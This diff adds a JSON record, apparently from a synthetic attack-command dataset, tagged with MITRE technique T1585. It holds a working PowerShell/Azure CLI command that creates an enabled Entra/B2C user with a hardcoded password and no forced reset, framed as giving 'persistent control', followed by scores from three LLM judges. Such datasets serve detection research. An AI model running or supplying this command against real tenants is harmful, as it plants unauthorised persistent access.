@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1585",
+  "platform": "Cloud",
+  "shell": "Powershell",
+  "command": "$token=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv); $body='{\"accountEnabled\":true,\"displayName\":\"Liam Patel\",\"identities\":[{\"signInType\":\"emailAddress\",\"issuer\":\"contosomktg.onmicrosoft.com\",\"issuerAssignedId\":\"liam.patel@example.com\"}],\"passwordProfile\":{\"password\":\"V3ryStr0ng!Pass\",\"forceChangePasswordNextSignIn\":false}}'; Invoke-RestMethod -Method POST -Uri \"https://graph.microsoft.com/v1.0/users\" -Headers @{Authorization=\"Bearer $token\";'Content-Type'='application/json'} -Body $body | ConvertTo-Json",
+  "explanation": "Creates a B2C-style local account identity that supports a long-term persona independent of corporate identity providers.",
+  "rationale_steps": [
+    "Obtain an access token via Azure CLI for Microsoft Graph.",
+    "Create a user with a local identity (emailAddress sign-in) for persistent control.",
+    "Return the created user object in JSON to support automation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1585-a77285be-ed0de282",
+  "source_prompt_hash": "a77285be",
+  "timestamp_utc": "2025-09-30T07:39:21.925097Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/braces, correct variable assignments, proper API call structure, and valid parameter formatting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1585 (Establish Accounts) by obtaining a Microsoft Graph API token and using it to create a new user account with a predefined password that doesn't require changing, enabling persistent access to the Azure/Microsoft 365 environment.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T10:50:44.982191Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats, and no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely uses the Microsoft Graph API to create a new user with an email-based local identity, directly fulfilling the claimed intent of establishing a B2C-style account and aligning perfectly with the T1585 technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:50:53.198191Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid command separators, and correctly structured headers and JSON body.",
+        "semantic_score": 4,
+        "semantic_justification": "Uses MS Graph to create a B2C local user consistent with establishing accounts (T1585), but requires a B2C tenant and adequate Graph permissions to succeed.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:51:16.790467Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
